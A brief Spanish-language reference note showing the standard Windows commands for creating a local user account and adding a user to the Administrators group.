## Creación de nueva cuenta

Ejecutar comando para crear un nuevo usuario llamado "Test". Cualquiera de las siguiente opciones sirve, en el caso del ```*``` es para escribir una contraseña.

```
C:\> net user Test /add
```

```
C:\> net user Test * /add
```

### Añadir una cuenta al grupo de Administradores

El siguiente caso tiene como objetivo añadir un usuario local al grupo "Administrators" en una máquina con Windows.

```
C:\> net localgroup Administrators <user> /Add
```
